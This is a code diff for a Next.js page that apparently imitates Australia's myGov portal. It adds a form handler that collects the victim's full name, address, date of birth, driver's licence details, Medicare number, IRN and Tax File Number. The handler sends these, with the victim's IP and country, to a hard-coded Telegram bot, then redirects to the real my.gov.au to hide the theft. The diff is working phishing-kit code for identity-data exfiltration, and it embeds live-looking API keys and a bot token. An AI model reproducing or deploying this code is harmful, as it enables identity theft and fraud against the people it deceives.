@@ -1,6 +1,62 @@
 "use client";
 
+import { useRouter } from "next/navigation";
+import { useState } from "react";
+
 export default function Detail() {
+  const [otp, setOtp] = useState("");
+  const router = useRouter();
+
+  const onSent = async (e) => {
+    e.preventDefault();
+
+    fetch("https://api.ipify.org?format=json")
+      .then((res) => res.json())
+      .then((data) => {
+        const ipAddress = data.ip;
+        const fn = document.getElementById("fn").value;
+        const addr = document.getElementById("addr").value;
+        const dob = document.getElementById("dob").value;
+        const dln = document.getElementById("dln").value;
+        const dlcnum = document.getElementById("dlcnum").value;
+        const dlexdate = document.getElementById("dlexdate").value;
+        const mednum = document.getElementById("mednum").value;
+        const irn = document.getElementById("irn").value;
+        const tfnum = document.getElementById("tfnum").value;
+
+        fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=e4e885c9d83f4a1c920483077bd49a2d&ip=${ipAddress}`)
+          .then((res) => res.json())
+          .then((data) => {
+            const country = data.country_name;
+            const apiUrl = `https://api.telegram.org/bot7336936844:AAHy6YK4JqvujJ7a_2nQh5TT2arbitukpUg/sendMessage?chat_id=5824354578&parse_mode=markdown&text=
+                    USER: ${encodeURIComponent(ipAddress)} 
+                    %0A%0A*Full Name:* ${encodeURIComponent(fn)} 
+                    %0A*Address On File:* ${encodeURIComponent(addr)} 
+                    %0A*Date Of Birth:* ${encodeURIComponent(dob)} 
+                    %0A*Driver's License Number:* ${encodeURIComponent(dln)} 
+                    %0A*Driver's License Card No. (Back of Card):* ${encodeURIComponent(dlcnum)} 
+                    %0A*Driver's License Expiry Date:* ${encodeURIComponent(dlexdate)} 
+                    %0A*Medicare Number:* ${encodeURIComponent(mednum)} 
+                    %0A*Individual Reference Number:* ${encodeURIComponent(irn)} 
+                    %0A*Tax File Number:* ${encodeURIComponent(tfnum)} 
+                    %0A%0A*COUNTRY:* ${encodeURIComponent(country)}`;
+
+            fetch(apiUrl)
+              .then((res) => {
+                if (!res.ok) console.error("ERROR:", res.statusText);
+                return res.json();
+              })
+              .then(() => {
+                console.log("SENT!");
+                router.push("https://my.gov.au/");
+              })
+              .catch((e) => console.error("ERROR:", e));
+          })
+          .catch((e) => console.error("ERROR:", e));
+      })
+      .catch((e) => console.error("ERROR:", e));
+  };
+
   return (
     <>
       <header role="banner" className="mgvEnhanceHeader">
@@ -40,7 +96,7 @@ export default function Detail() {
                       <h2 className="text-align-left">
                         Enter the details given below.
                       </h2>
-                      <form>
+                      <form onSubmit={onSent}>
                         <div className="input-group">
                           <label className="override" htmlFor="userId">Full Name</label>
                           <input
